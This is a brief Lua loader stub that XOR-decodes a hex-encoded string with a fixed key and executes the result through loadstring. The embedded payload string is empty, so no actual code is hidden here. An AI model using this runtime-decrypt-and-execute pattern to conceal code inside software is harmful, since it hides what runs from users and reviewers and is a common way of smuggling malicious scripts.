local k={128,69,100,159,195,95,99,53,204,102,194,72,21,228,99,152,205,51,216,13,224,255,147,101,92,8,237,21,223,200,43,224}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
